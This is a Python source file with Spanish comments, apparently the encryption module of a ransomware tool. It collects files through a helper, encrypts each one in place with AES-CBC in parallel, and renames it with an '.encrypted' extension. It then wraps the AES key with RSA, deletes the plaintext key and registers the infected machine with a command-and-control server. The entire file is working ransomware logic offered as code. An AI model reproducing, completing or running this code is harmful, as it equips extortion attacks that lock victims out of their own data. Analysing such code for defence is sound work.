import os
import multiprocessing
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from find_files import find_files
import gen_keys
import agent

def load_aes_key():
    ruta_clave = os.path.abspath("aes_key.bin")
    if os.path.exists(ruta_clave):
        with open(ruta_clave, "rb") as clave_file:
            return clave_file.read()
    else:
        raise FileNotFoundError(f"El archivo de clave no se encuentra en: {ruta_clave}")

def encrypt_file(file, aes_key):
    try:
        iv = os.urandom(16)  # Vector de inicialización
        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
        with open(file, "rb") as f:
            datos = f.read()
        datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))
        with open(file, "wb") as f:
            f.write(iv + datos_cifrados)  
        encrypted_file = file + ".encrypted"
        os.rename(file, encrypted_file)  # Renombrar el archivo con extensión personalizada
        print(f"Archivo cifrado: {encrypted_file}")
    except Exception as e:
        print(f"Error cifrando {file}: {e}")

def encrypt_aes_key(clave_aes):
    gen_keys.generate_rsa_key()
    if not os.path.exists("rsa_public.pem"):
        raise FileNotFoundError("El archivo de clave pública RSA 'rsa_public.pem' no se encuentra.")
    with open("rsa_public.pem", "rb") as f:
        clave_publica = RSA.import_key(f.read())
    cipher_rsa = PKCS1_OAEP.new(clave_publica)
    clave_cifrada = cipher_rsa.encrypt(clave_aes)
    with open("aes_key_encrypted.bin", "wb") as f:
        f.write(clave_cifrada)
    print("Clave AES cifrada con RSA y guardada en aes_key_encrypted.bin.")
    if not os.path.exists("rsa_private.pem"):
        raise FileNotFoundError("El archivo de clave privada RSA 'rsa_private.pem' no se encuentra.")

def encrypt_files():
    gen_keys.generate_aes_key()  # Generar clave simétrica
    aes_key = load_aes_key()  # Cargar la clave simétrica
    files = find_files()  # Obtener lista de archivos a cifrar
    if not files or not isinstance(files, list):  # Verifica si la lista es válida
        print("Error: No se pudo obtener la lista de archivos o está vacía.")
        return
    with multiprocessing.Pool(processes=os.cpu_count()) as pool:
        pool.starmap(encrypt_file, [(file, aes_key) for file in files])
    print("Archivos cifrados correctamente.")
    encrypt_aes_key(aes_key)  # Se cifra la clave AES con RSA
    os.remove("aes_key.bin")  # Eliminar clave simétrica sin cifrar
    agent.register_agent()  # Registrar agente en C2

if __name__ == "__main__":
    encrypt_files()
